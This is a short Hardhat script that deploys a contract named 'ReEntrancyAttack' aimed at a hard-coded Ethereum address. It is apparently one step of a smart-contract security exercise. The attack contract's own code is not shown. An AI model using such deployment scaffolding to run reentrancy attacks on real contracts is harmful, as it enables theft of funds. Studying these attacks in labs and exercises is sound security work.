const hre = require("hardhat");
const target = "0x5F44f67E23343986EdDa008cC3fDE63398FA2E12";

async function main() {
  const Attack = await hre.ethers.getContractFactory("ReEntrancyAttack");
  const attack = await Attack.deploy(target);

  await attack.deployed();

  console.log("Attack deployed to:", attack.address);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
